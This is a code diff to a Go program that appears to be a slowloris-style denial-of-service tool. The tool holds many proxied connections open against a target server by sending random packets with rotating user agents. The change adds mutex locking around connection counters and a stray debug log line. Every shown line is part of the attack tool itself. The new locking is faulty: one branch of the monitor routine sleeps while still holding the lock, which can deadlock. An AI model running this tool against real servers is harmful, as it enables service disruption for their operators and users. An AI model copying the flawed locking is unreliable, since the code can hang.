@@ -10,10 +10,13 @@ import (
 	"net/url"
 	"os"
 	"strings"
+	"sync"
 	"time"
 
 	"golang.org/x/net/proxy"
 )
+
+var lock = &sync.Mutex{}
 
 type attackParams struct {
 	serverURL   *url.URL
@@ -98,7 +101,7 @@ func main() {
 	i := 0
 	for ; i <= cons; i++ {
 		agent := attack.agents[rand.Intn(len(attack.agents))]
-
+		log.Println("dayum son")
 		connection, err := createConnection(endpoint, attack.serverURL.Path, agent, dial, i)
 		if err != nil {
 			opErr := err.(*net.OpError)
@@ -119,8 +122,10 @@ func main() {
 
 			break
 		} else {
-			(*attack.currConn)++
+			lock.Lock()
+			*attack.currConn++
 			go connection.start(attack.currConn, attack.timeout, quit)
+			lock.Unlock()
 		}
 	}
 
@@ -160,7 +165,11 @@ func (m *connection) start(counter, timeout *uint64, quit chan bool) {
 			_, err = m.conn.Write(randPackets)
 			if err != nil {
 				log.Printf("Failed sending random packet to #%d socket:\n\t%v\n", m.id, err)
-				(*counter)--
+
+				lock.Lock()
+				*counter--
+				lock.Unlock()
+
 				return
 			}
 
@@ -180,7 +189,9 @@ func monitor(attack *attackParams, address *net.TCPAddr, id int, dial func() (ne
 		default:
 			log.Println("Trying to open a new socket from the monitor routine...")
 
+			lock.Lock()
 			if *attack.maxConn > *attack.currConn || *attack.auto {
+				lock.Unlock()
 				connection, err := createConnection(address, attack.serverURL.Path, attack.agents[rand.Intn(len(attack.agents))], dial, id)
 
 				if err != nil {
@@ -189,8 +200,12 @@ func monitor(attack *attackParams, address *net.TCPAddr, id int, dial func() (ne
 				} else {
 					log.Printf("Successfully opened #%d socket\n", id)
 				}
-				(*attack.currConn)++
+
+				lock.Lock()
+				*attack.currConn++
 				go connection.start(attack.currConn, attack.timeout, quit)
+				lock.Unlock()
+
 				id++
 			} else {
 				time.Sleep(retry)
